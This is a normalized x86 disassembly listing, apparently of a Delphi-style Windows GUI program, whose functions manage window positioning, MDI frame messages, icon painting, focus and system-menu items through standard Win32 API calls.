jmp r-xdata
mov eax esi
call sub_450020
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4464d0
push eax
call SetWindowPos
jmp r-xdata
sub_45a68e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45a7b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_443620
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45cbac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7c0
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45a7c8
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44388c
push 0x0
mov eax ebx
call sub_4464d0
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45a80c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444010
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4464d0
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45a870
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a918
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a91f
lea eax [ ebp - 0x4 ]
call sub_404038
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
mov eax edi
call sub_456c04
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4034e4
mov eax ebx
call sub_45ac28
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4034e4
test al al
jne r-xdata
sub_45a928
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_442f74
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_442f74
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45a870
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45a970
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45a870
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45a994
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4176b4
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4175ec
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4176b4
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4175ec
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45ac04
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4464d0
mov dx 0xb000
call sub_4569c4
test al al
jne r-xdata
call sub_4464d0
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4569c4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac0b
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403b20
jmp r-xdata
call sub_403b20
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_442f74
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4464d0
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4569c4
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_440e64
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
call sub_403b20
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4464d0
mov dx 0xb01a
call sub_4569c4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403b20
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_440e64
sub_45ac28
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_440e64
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4464d0
push eax
call SetFocus
mov eax ebx
call sub_4464d0
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45ac78
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_440e64
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45ad2c
mov eax esi
call sub_45ac28
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4468f8
mov edx eax
mov eax esi
call sub_45a870
sub_45acdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4598f4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_440e64
mov eax ebx
call sub_4598f4
mov edx esi
call sub_45acdc
sub_45ad2c
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_453b4c
mov edx esi
call sub_453b30
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45add4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_45ae20
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45add4
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45ae50
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45add4
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45aebc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4210c0
xor eax eax
push ebp
push sub_45af6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_4214ec
xor eax eax
push ebp
push sub_45af47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4034e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af4e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_4214ec
retn
sub_45af78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4598f4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_459928
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4034e4
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_445760
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_459974
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4034e4
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45b018
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4464d0
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45aea0
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4464d0
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_444628
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45b096
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45b0f8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4448ec
pop edi
pop esi
retn
sub_45b144
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4464d0
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45b240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_459c68
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45b144
pop ecx
sub_45b274
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_441380
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4464d0
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_440358
pop esi
pop ebx
retn
sub_45b304
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4456ec
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45356c
sub_45b364
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_444788
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_452f80
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45b3b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4537e0
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45b3e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45b483
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b48a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_452ee0
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4601a4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43ce14
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4601a4
jmp r-xdata
sub_45b4b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034e4
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45b4f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40ccdc
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45b51c
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45acdc
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43cbec
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45b574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4455d0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45eb58
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4034e4
sub_45b600
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4464d0
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45b698
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4464d0
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45ac78
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4034e4
sub_45b6f0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_446a04
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45b71c
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45acdc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45b738
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_452f10
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_452f10
sub_45b778
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45b7b0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40408c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45b7e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45b935
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b93c
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45b738
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43cb90
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416114
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43f7c8
lea eax [ ebp - 0x1c ]
call sub_406d00
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45b738
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45b778
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45fe48
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45feb0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45feb0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45b7b0
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416114
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
